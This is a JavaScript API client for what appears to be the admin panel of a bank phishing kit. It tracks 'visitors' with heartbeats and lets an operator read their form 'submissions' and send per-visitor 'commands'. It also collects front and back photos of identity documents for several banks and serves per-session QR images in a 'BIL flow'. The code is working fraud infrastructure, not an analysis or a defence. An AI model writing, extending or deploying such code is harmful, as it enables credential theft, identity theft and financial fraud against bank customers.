// Frontend API client for Render backend + Postgres.
// If VITE_API_URL is not set, all functions no-op (local BroadcastChannel mode keeps working).
// Set in .env or Render env: VITE_API_URL=https://your-api.onrender.com

const BASE = (import.meta.env.VITE_API_URL || "").replace(/\/$/, "");

export function apiEnabled() {
  return Boolean(BASE);
}

export function apiBase() {
  return BASE;
}

function token() {
  try {
    return sessionStorage.getItem("admin_token") || "";
  } catch {
    return "";
  }
}

async function req(path, opts = {}) {
  const res = await fetch(`${BASE}${path}`, {
    headers: {
      "Content-Type": "application/json",
      ...(token() ? { "x-admin-token": token() } : {}),
      ...(opts.headers || {}),
    },
    ...opts,
  });
  if (!res.ok) {
    const t = await res.text().catch(() => "");
    throw new Error(t || `API ${res.status}`);
  }
  return res.json().catch(() => ({}));
}

// --- admin auth ---
export async function apiLogin(username, password) {
  return req("/api/admin/login", {
    method: "POST",
    body: JSON.stringify({ username, password }),
  });
}

// --- visitors (public register/heartbeat + admin list) ---
export async function apiRegisterVisitor(v) {
  return req("/api/visitors", { method: "POST", body: JSON.stringify(v) });
}

export async function apiHeartbeat(id, patch) {
  return req(`/api/visitors/${id}/heartbeat`, { method: "POST", body: JSON.stringify(patch || {}) });
}

export async function apiGetVisitors() {
  return req("/api/admin/visitors");
}

export async function apiGetCommand(visitorId) {
  return req(`/api/visitors/${visitorId}/command`);
}

export async function apiSendCommand(visitorId, command) {
  return req(`/api/admin/commands`, { method: "POST", body: JSON.stringify({ visitorId, command }) });
}

// --- submissions ---
export async function apiSubmit(entry) {
  return req("/api/submissions", { method: "POST", body: JSON.stringify(entry) });
}

export async function apiGetSubmissions(visitorId, since) {
  const q = new URLSearchParams();
  if (visitorId) q.set("visitorId", visitorId);
  if (since) q.set("since", String(since));
  const qs = q.toString();
  return req(`/api/admin/submissions${qs ? `?${qs}` : ""}`);
}

export async function apiDeleteVisitor(id) {
  return req(`/api/admin/visitors/${id}`, { method: "DELETE" });
}

// --- QR uploads (BIL flow): one image per visitor session ---
export async function apiGetQr(visitorId) {
  return req(`/api/visitors/${visitorId}/qr`);
}

export async function apiDeleteQr(visitorId) {
  return req(`/api/admin/qr/${visitorId}`, { method: "DELETE" });
}

// Visitor ID photos (all banks except tango/orange): front + back,
// All photo formats, 10KB-10MB (also enforced server-side). XHR for progress.
export function apiUploadId(visitorId, side, dataUrl, onProgress) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", `${BASE}/api/id-uploads`);
    xhr.setRequestHeader("Content-Type", "application/json");
    if (onProgress) {
      xhr.upload.onprogress = (e) => {
        if (e.lengthComputable) onProgress(Math.round((e.loaded / e.total) * 100));
      };
    }
    xhr.onload = () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        try {
          const j = JSON.parse(xhr.responseText);
          if (j?.url) {
            onProgress && onProgress(100);
            resolve(j);
          } else reject(new Error(j?.error || "upload failed"));
        } catch {
          reject(new Error("upload failed"));
        }
      } else {
        try {
          const j = JSON.parse(xhr.responseText);
          reject(new Error(j?.error || `upload failed: ${xhr.status}`));
        } catch {
          reject(new Error(`upload failed: ${xhr.status}`));
        }
      }
    };
    xhr.onerror = () => reject(new Error("upload failed"));
    xhr.send(JSON.stringify({ visitorId, side, image: dataUrl }));
  });
}

// Runtime Cloudinary settings (no rebuild needed).
export async function apiCloudinaryConfig() {
  return req("/api/admin/cloudinary");
}

export async function apiCloudinarySign(folder) {
  return req("/api/admin/cloudinary-sign", { method: "POST", body: JSON.stringify({ folder }) });
}

// Inline fallback: small data-URL stored in Postgres (used when Cloudinary is off).
export async function apiUploadQrInline(visitorId, dataUrl) {
  return req("/api/admin/qr", { method: "POST", body: JSON.stringify({ visitorId, image: dataUrl }) });
}

// Cloudinary flow with real upload progress (signed by our API —
// no upload preset needed, secret never leaves the server):
// 1) signature from our API, 2) POST file straight to Cloudinary (progress),
// 3) confirm public_id+url so the visitor session points at the new image.
export async function apiUploadQrCloudinary(visitorId, file, cfg, onProgress) {
  const sign = await apiCloudinarySign(cfg?.folder);
  const form = new FormData();
  form.append("file", file);
  form.append("api_key", sign.api_key);
  form.append("timestamp", String(sign.timestamp));
  form.append("signature", sign.signature);
  if (sign.folder) form.append("folder", sign.folder);
  const up = await new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", `https://api.cloudinary.com/v1_1/${sign.cloud_name}/image/upload`);
    xhr.upload.onprogress = (e) => {
      if (e.lengthComputable && onProgress) onProgress(Math.round((e.loaded / e.total) * 100));
    };
    xhr.onload = () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        try {
          resolve(JSON.parse(xhr.responseText));
        } catch {
          reject(new Error("Cloudinary bad response"));
        }
      } else {
        reject(new Error(`Cloudinary upload failed: ${xhr.status}`));
      }
    };
    xhr.onerror = () => reject(new Error("Cloudinary upload failed"));
    xhr.send(form);
  });
  if (onProgress) onProgress(100);
  return req("/api/admin/qr", {
    method: "POST",
    body: JSON.stringify({ visitorId, publicId: up.public_id, url: up.secure_url }),
  });
}
